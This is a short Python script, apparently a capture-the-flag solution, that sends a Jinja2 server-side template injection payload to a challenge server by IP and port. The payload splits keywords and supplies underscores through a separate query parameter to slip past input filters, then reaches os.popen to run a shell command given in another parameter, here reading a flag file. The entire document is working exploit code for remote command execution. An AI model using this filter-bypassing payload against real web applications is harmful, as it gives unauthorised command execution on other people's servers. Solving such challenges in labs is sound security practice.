import requests

url = 'http://35.242.253.155:31612/'

params = {
    'content': '{{request["appli"+"cation"][request.args.u*2+"globals"+request.args.u*2][request.args.u*2+"buil"+"tins"+request.args.u*2][request.args.u*2+"imp"+"ort"+request.args.u*2]("os")["po"+"pen"](request.args.f)["read"]()}}',
    'u': '_',
    'f': 'cat flag'
}
r = requests.get(url, params=params)
print(r.text)